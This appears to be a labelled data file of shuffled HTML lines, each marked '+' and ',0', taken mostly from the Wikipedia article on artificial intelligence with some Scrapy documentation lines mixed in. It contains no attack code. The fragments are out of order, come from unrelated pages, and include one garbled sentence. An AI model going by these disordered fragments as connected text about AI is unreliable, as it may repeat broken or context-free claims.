+"<li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",0
+"<div role=""navigation"" class=""navbox"" aria-labelledby=""Emerging_technologies_in_information_and_communications"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"" style=""text-align: center;"">",0
+"<h3><span class=""mw-headline"" id=""Evaluating_progress"">Evaluating progress ",0
+" </p><p>AI is also being used by <a href=""/wiki/Corporate_finance"" title=""Corporate finance"">corporations </a>. Whereas AI <a href=""/wiki/CEO"" class=""mw-redirect"" title=""CEO"">CEO </a>'s are still 30 years away,<sup id=""cite_ref-320"" class=""reference""><a href=""#cite_note-320"">&#91;309&#93; </a> </sup><sup id=""cite_ref-321"" class=""reference""><a href=""#cite_note-321"">&#91;310&#93; </a> </sup> <a href=""/wiki/Robotic_process_automation"" title=""Robotic process automation"">robotic process automation </a> (RPA) is already being used today in corporate finance. RPA uses artificial intelligence to train and teach software robots to process transactions, monitor compliance and audit processes automatically.<sup id=""cite_ref-322"" class=""reference""><a href=""#cite_note-322"">&#91;311&#93; </a> </sup>",0
+"<li>if a move ""forks"" to create two threats at once, play that move. Otherwise, </li>",0
+"<h3><span class=""mw-headline"" id=""Search_and_optimization"">Search and optimization ",0
+<h3>,0
+"<li><cite id=""CITEREFNilsson1998"" class=""citation book""><a href=""/wiki/Nils_Nilsson_(researcher)"" class=""mw-redirect"" title=""Nils Nilsson (researcher)"">Nilsson, Nils </a> (1998). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/artificialintell0000nils""><i>Artificial Intelligence: A New Synthesis </i> </a> ",0
+      jQuery(function () {,0
+"<a href=""/wiki/Bayesian_network"" title=""Bayesian network"">Bayesian networks </a>:",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=BBC+News&amp;rft.atitle=Single+pixel+change+fools+AI+programs&amp;rft.date=2017-11-03&amp;rft_id=https%3A%2F%2Fwww.bbc.com%2Fnews%2Ftechnology-41845878&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li id=""cite_note-lecun2016slides-257""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-lecun2016slides_257-0"">^ </a> </b> ",0
+"<li><cite id=""CITEREFNilsson1983"" class=""citation journal""><a href=""/wiki/Nils_Nilsson_(researcher)"" class=""mw-redirect"" title=""Nils Nilsson (researcher)"">Nilsson, Nils </a> (1983). <a rel=""nofollow"" class=""external text"" href=""https://ai.stanford.edu/~nilsson/OnlinePubs-Nils/General%20Essays/AIMag04-04-002.pdf"">""Artificial Intelligence Prepares for 2001"" </a> <span class=""cs1-format"">(PDF) ",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+deepfake+news+could+target+them+online&amp;rft.aulast=Brown&amp;rft.aufirst=Eileen&amp;rft_id=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fhalf-of-americans-do-not-believe-deepfake-news-could-target-them-online%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0
+"<li><cite id=""CITEREFHutter2012"" class=""citation book"">Hutter, M. (2012). ""One Decade of Universal Artificial Intelligence"". <i>Theoretical Foundations of Artificial General Intelligence </i>. Atlantis Thinking Machines. <b>4 </b>. pp.&#160;67–88. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.228.8725"">10.1.1.228.8725 </a> ",0
+"	 </span> </a> </i>&#93; </sup>. One advantage of neuroevolution is that it may be less prone to get caught in ""dead ends"".<sup id=""cite_ref-245"" class=""reference""><a href=""#cite_note-245"">&#91;234&#93; </a> </sup>",0
+         </div>           ,0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=77"" title=""Edit section: External links"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li><cite id=""CITEREFGladwell2005"" class=""citation book""><a href=""/wiki/Malcolm_Gladwell"" title=""Malcolm Gladwell"">Gladwell, Malcolm </a> (2005). <a href=""/wiki/Blink_(book)"" class=""mw-redirect"" title=""Blink (book)""><i>Blink </i> </a>. New York: Little, Brown and Co. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-316-17232-5"" title=""Special:BookSources/978-0-316-17232-5""><bdi>978-0-316-17232-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Blink&amp;rft.place=New+York&amp;rft.pub=Little%2C+Brown+and+Co.&amp;rft.date=2005&amp;rft.isbn=978-0-316-17232-5&amp;rft.aulast=Gladwell&amp;rft.aufirst=Malcolm&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"	 <div class=""magnify""><a href=""/wiki/File:Capek_play.jpg"" class=""internal"" title=""Enlarge""> </a> </div>The word ""robot"" itself was coined by <a href=""/wiki/Karel_%C4%8Capek"" title=""Karel Čapek"">Karel Čapek </a> in his 1921 play <i><a href=""/wiki/R.U.R."" title=""R.U.R."">R.U.R. </a> </i>, the title standing for ""<a href=""/wiki/Rossum%27s_Universal_Robots"" class=""mw-redirect"" title=""Rossum&#39;s Universal Robots"">Rossum's Universal Robots </a>"" </div> </div> </div>",0
+"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;~363–379, </li>",0
+"<a href=""/wiki/Intractably"" class=""mw-redirect"" title=""Intractably"">Intractability and efficiency </a> and the <a href=""/wiki/Combinatorial_explosion"" title=""Combinatorial explosion"">combinatorial explosion </a>:",0
+"<li><a href=""/wiki/Cybernetics_in_the_Soviet_Union"" title=""Cybernetics in the Soviet Union"">Cybernetics in the Soviet Union </a> </li>",0
+"<li id=""cite_note-307""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-307"">^ </a> </b> ",0
+"<ul><li><a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Herbert Simon </a> quote: <a href=""#CITEREFSimon1965"">Simon 1965 </a>, p.&#160;96 quoted in <a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, p.&#160;109. </li>",0
+"		<a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Special:Log&amp;type=review&amp;page=Artificial_intelligence"">reviewed </a> on <i>16 March 2020 </i>. </div>",0
+"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=69"" title=""Edit section: In fiction"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li><a href=""/wiki/William_Grey_Walter"" title=""William Grey Walter"">William Grey Walter </a> </li>",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Fortune&amp;rft.atitle=Why+Deep+Learning+Is+Suddenly+Changing+Your+Life&amp;rft.date=2016&amp;rft_id=http%3A%2F%2Ffortune.com%2Fai-artificial-intelligence-deep-machine-learning%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"	 </span>. Brussels: European Commission. 2020. p.&#160;1. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=White+Paper%3A+On+Artificial+Intelligence+-+A+European+approach+to+excellence+and+trust&amp;rft.place=Brussels&amp;rft.pages=1&amp;rft.pub=European+Commission&amp;rft.date=2020&amp;rft_id=https%3A%2F%2Fec.europa.eu%2Finfo%2Fsites%2Finfo%2Ffiles%2Fcommission-white-paper-artificial-intelligence-feb2020_en.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"	 </span> <span class=""toctext"">Statistical learning ",0
+"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 13 </li> </ul>",0
+"	<input type=""checkbox"" class=""vectorMenuCheckbox"" aria-labelledby=""p-variants-label"" />",0
+"<li><a href=""/wiki/Distributed_artificial_intelligence"" title=""Distributed artificial intelligence"">Distributed artificial intelligence </a> </li> </ul>",0
+" </p><p>Moreover, the application of <a href=""/wiki/Personality_computing"" title=""Personality computing"">Personality computing </a> AI models can help reducing the cost of advertising campaigns by adding psychological targeting to more traditional sociodemographic or behavioral targeting.<sup id=""cite_ref-Celli_et_al._2017_342-0"" class=""reference""><a href=""#cite_note-Celli_et_al._2017-342"">&#91;331&#93; </a> </sup>",0
+"<li id=""cite_note-AI_as_evolution-412""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_as_evolution_412-0"">^ </a> </b> ",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=BBC+News&amp;rft.atitle=Microsoft%27s+Bill+Gates+insists+AI+is+a+threat&amp;rft.date=2015-01-29&amp;rft.aulast=Rawlinson&amp;rft.aufirst=Kevin&amp;rft_id=https%3A%2F%2Fwww.bbc.co.uk%2Fnews%2F31047780&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""/wiki/Learning_classifier_system"" title=""Learning classifier system"">Learning classifier system </a> </li> </ul>",0
+"<li><cite id=""CITEREFBBC_News2006"" class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://news.bbc.co.uk/2/hi/technology/6200005.stm"">""Robots could demand legal rights"" </a>. <i>BBC News </i>. 21 December 2006<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">3 February ",0
+"<li id=""cite_note-408""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-408"">^ </a> </b> ",0
+"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;91–104 </li>",0
+"<li><a href=""/wiki/Francis_Heylighen"" title=""Francis Heylighen"">Francis Heylighen </a> </li>",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Chinese_room"" title=""Chinese room"">Chinese room </a> </div>",0
+"<li><cite id=""CITEREFLaw1994"" class=""citation techreport"">Law, Diane (June 1994). <i>Searle, Subsymbolic Functionalism and Synthetic Intelligence </i> (Technical report). University of Texas at Austin. p.&#160;AI94-222. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.38.8384"">10.1.1.38.8384 </a> ",0
+"<p>The ch as reasoning and logic. The functional model refers to the correlating data to its computed counterpart.<sup id=""cite_ref-87"" class=""reference""><a href=""#cite_note-87"">&#91;84&#93; </a> </sup> consist of particular traits or capabilities that researchers expect an intelligent system to display. The traits described below have received the most attention.<sup id=""cite_ref-Problems_of_AI_15-2"" class=""reference""><a href=""#cite_note-Problems_of_AI-15"">&#91;15&#93; </a> </sup>",0
+          <footer>,0
+"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""/wiki/Robotic_process_automation"" title=""Robotic process automation"">Robotic process automation </a> </li>",0
+"<link rel=""EditURI"" type=""application/rsd+xml"" href=""//en.wikipedia.org/w/api.php?action=rsd""/>",0
+"<li id=""cite_note-FOOTNOTEDomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"">^ </a> </b> ",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=latimes.com&amp;rft.atitle=Palantir+once+mocked+the+idea+of+salespeople.+Now+it%27s+hiring+them&amp;rft.date=2019-01-07&amp;rft.aulast=Chapman&amp;rft.aufirst=Lizette&amp;rft_id=https%3A%2F%2Fwww.latimes.com%2Fbusiness%2Fla-fi-palantir-sales-ipo-20190107-story.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><cite id=""CITEREFHolland1975"" class=""citation book"">Holland, John H. (1975). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/adaptationinnatu00holl""><i>Adaptation in Natural and Artificial Systems </i> </a> ",0
+" </p><p>Today, neural networks are often trained by the <a href=""/wiki/Backpropagation"" title=""Backpropagation"">backpropagation </a> algorithm, which had been around since 1970 as the reverse mode of <a href=""/wiki/Automatic_differentiation"" title=""Automatic differentiation"">automatic differentiation </a> published by <a href=""/wiki/Seppo_Linnainmaa"" title=""Seppo Linnainmaa"">Seppo Linnainmaa </a>,<sup id=""cite_ref-lin1970_239-0"" class=""reference""><a href=""#cite_note-lin1970-239"">&#91;228&#93; </a> </sup><sup id=""cite_ref-grie2012_240-0"" class=""reference""><a href=""#cite_note-grie2012-240"">&#91;229&#93; </a> </sup> and was introduced to neural networks by <a href=""/wiki/Paul_Werbos"" title=""Paul Werbos"">Paul Werbos </a>.<sup id=""cite_ref-WERBOS1974_241-0"" class=""reference""><a href=""#cite_note-WERBOS1974-241"">&#91;230&#93; </a> </sup><sup id=""cite_ref-werbos1982_242-0"" class=""reference""><a href=""#cite_note-werbos1982-242"">&#91;231&#93; </a> </sup><sup id=""cite_ref-Backpropagation_243-0"" class=""reference""><a href=""#cite_note-Backpropagation-243"">&#91;232&#93; </a> </sup>",0
+"<li id=""cite_note-79""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-79"">^ </a> </b> ",0
+"           <a href=""#"" class=""icon icon-home""> Scrapy",0
+"<li><a href=""/wiki/Underdetermination"" title=""Underdetermination"">Underdetermination </a> </li>",0
+"<li id=""cite_note-48""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-48"">^ </a> </b> ",0
+	 </span></a></dt><dd>Learn how to scrape with your browser’s developer tools.</dd>,0
+"<li id=""cite_note-101""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-101"">^ </a> </b> ",0
+"<div role=""navigation"" class=""navbox"" aria-labelledby=""Links_to_related_articles"" style=""padding:3px""><table class=""nowraplinks mw-collapsible mw-collapsed navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"" style=""background:#e8e8ff;"">",0
+"	 </span> <span class=""toctext"">The limits of artificial general intelligence ",0
+"<li id=""cite_note-Logic-194""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Logic_194-0"">^ </a> </b> ",0
+	 </span></a></dt><dd>Get familiar with some Scrapy common practices.</dd>,0
+"<li><a href=""/wiki/Adam_Tooze"" title=""Adam Tooze"">Tooze, Adam </a>, ""Democracy and Its Discontents"", <i><a href=""/wiki/The_New_York_Review_of_Books"" title=""The New York Review of Books"">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52–53, 56–57.  ""Democracy has no clear answer for the mindless operation of <a href=""/wiki/Bureaucracy"" title=""Bureaucracy"">bureaucratic </a> and <a href=""/wiki/Technology"" title=""Technology"">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>.  Likewise, after decades of dire warning, the <a href=""/wiki/Environmentalism"" title=""Environmentalism"">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=""/wiki/Corporation"" title=""Corporation"">corporations </a> and the technologies they promote.""  (pp.&#160;56–57.) </li> </ul>",0
+"<li><a href=""/wiki/Wikidata"" title=""Wikidata"">Wikidata </a><span class=""nowrap"">&#160; ",0
+"	 </span> on 25 July 2004. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=4-D%2FRCS%3A+A+Reference+Model+Architecture+for+Intelligent+Unmanned+Ground+Vehicles&amp;rft.btitle=Proceedings+of+the+SPIE+AeroSense+Session+on+Unmanned+Ground+Vehicle+Technology&amp;rft.series=Unmanned+Ground+Vehicle+Technology+IV&amp;rft.pages=11-20&amp;rft.date=2002&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.15.14&amp;rft_id=info%3Adoi%2F10.1117%2F12.474462&amp;rft_id=info%3Abibcode%2F2002SPIE.4715..303A&amp;rft.aulast=Albus&amp;rft.aufirst=J.+S.&amp;rft_id=http%3A%2F%2Fwww.isd.mel.nist.gov%2Fdocuments%2Falbus%2F4DRCS.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+    <h2>Navigation menu </h2>,0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=cnet&amp;rft.atitle=Getting+Machines+to+Think+Like+Us&amp;rft.date=2006-07-03&amp;rft.aulast=Skillings&amp;rft.aufirst=Jonathan&amp;rft_id=http%3A%2F%2Fnews.cnet.com%2FGetting-machines-to-think-like-us%2F2008-11394_3-6090207.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;939 </li> </ul>",0
+"	<div class=""thumbinner"" style=""width:222px;"">",0
+"<li><a href=""/wiki/Relationship_between_religion_and_science"" title=""Relationship between religion and science"">Relationship between religion and science </a> </li>",0
+"<li id=""cite_note-378""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-378"">^ </a> </b> ",0
